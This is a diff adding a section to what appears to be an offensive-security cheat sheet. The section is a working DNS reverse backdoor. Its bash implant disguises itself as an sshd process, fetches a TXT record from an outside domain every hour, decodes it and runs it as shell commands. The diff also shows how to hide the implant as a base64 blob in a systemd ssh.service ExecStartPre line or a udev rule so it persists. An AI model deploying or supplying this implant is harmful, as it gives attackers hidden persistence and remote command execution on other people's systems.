@@ -1869,6 +1869,42 @@ Can also be triggered via `~/.bashrc` or the user's crontab. Use (example):
 bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 -d);}"'&>/dev/null
 ```
 
+An elaborate DNS reverse backdoor (as a daemon and living-off-the-land):
+- Hides as `sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups`
+- Requests a TXT record every 60 minutes (from b00m2.team-teso.net).
+- Base64-decode the TXT record and execute the command on the target.
+
+1. Modify the following to your liking and then Cut & Paste it to get the 1-line implant. 
+
+```shell
+base64 -w0 >x.txt <<-'EOF'
+D=b00m2.team-teso.net
+P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
+M=/dev/shm/.cache${UID}
+[ -f $M ]&&exit
+touch $M
+(echo 'slp(){ local IFS;[ -n "${_sfd:-}" ]||exec {_sfd}<> <(:);read -t$1 -u$_sfd||:;}
+slp 1
+while :; do
+	dig +short '"$D"' TXT|tr -d \ \"|base64 -d|bash
+	slp 3600
+done'|exec -a "$P" bash &) &>/dev/null
+EOF
+echo "===> Execute the following on the target:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
+```
+
+2. Add this 1-line implant to any startup script on the target (e.g. to [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=` in */usr/lib/systemd/system/ssh.service*). An example ssh.service:
+```
+...
+[Service]
+EnvironmentFile=-/etc/default/ssh
+Environment="SSHD=echo RD1iMDBtMi50ZWFtLXRlc28ubmV0ClA9InNzaGQ6IC91c3Ivc2Jpbi9zc2hkIC1EIFtsaXN0ZW5lcl0gMCBvZiAxMC0xMDAgc3RhcnR1cHMiCk09L2Rldi9zaG0vLmNhY2hlJHtVSUR9ClsgLWYgJE0gXSYmZXhpdAp0b3VjaCAkTQooZWNobyAnc2xwKCl7IGxvY2FsIElGUztbIC1uICIke19zZmQ6LX0iIF18fGV4ZWMge19zZmR9PD4gPCg6KTtyZWFkIC10JDEgLXUkX3NmZHx8Ojt9CnNscCAxCndoaWxlIDo7IGRvCmRpZyArc2hvcnQgJyIkRCInIFRYVHx0ciAtZCBcIFwifGJhc2U2NCAtZHxiYXNoCnNscCAzNjAwCmRvbmUnfGV4ZWMgLWEgIiRQIiBiYXNoICYpICY+L2Rldi9udWxsCg==|base64 -d|bash"
+ExecStartPre=bash -c 'eval $SSHD'
+ExecStartPre=/usr/sbin/sshd -t
+ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
+...
+```
+   
 <a id="ld-backdoor"></a>
 **6.vii. Local Root Backdoor**
 
